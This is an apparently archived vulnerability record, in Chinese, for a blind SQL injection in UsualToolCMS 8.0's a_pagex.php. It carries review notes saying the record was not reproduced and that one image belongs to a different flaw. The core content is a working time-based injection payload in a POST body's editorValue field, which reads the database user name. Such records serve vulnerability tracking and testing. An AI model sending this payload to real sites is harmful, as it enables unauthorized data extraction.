---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0 a_pagex"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 a_pagex.php盲注"
prerequisites: "来源所述条件，未列明部分仍待核：后台页面编辑权限、手加editorValue字段、DBsleep"
side_effects: "未执行；本文需注意的操作影响：首图指a_bookx另一漏洞，需核图文；id2页面写入副作用"
source_status: "unknown"
id: "vw-8efc22d37f5d89d2a101d57d"
entity_id: "ve-8efc22d37f5d89d2a101d57d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台页面编辑权限、手加editorValue字段、DBsleep

- **凭据与会话边界（1）**：只有POST body无完整URL/action/会话，关键参数需手加是重要条件。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **操作与副作用边界（2）**：首图指a_bookx另一漏洞，需核图文；id2页面写入副作用。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（3）**：没有源码/真假时间对照文本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms 8.0 a\_pagex.php盲注

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

### poc

![1.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId25.png)

    pagename=test&istop=0&isbottom=0&title=test&webkey=test&description=test&editorValue=1'and if(ascii(substr(user(),1,1))=100,sleep(2),1)#&id=2&submit=%E7%BC%96%E8%BE%91

editorValue参数需要手动添加

![2.png](./.resource/UsualToolcms8.0a_pagex.php盲注/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
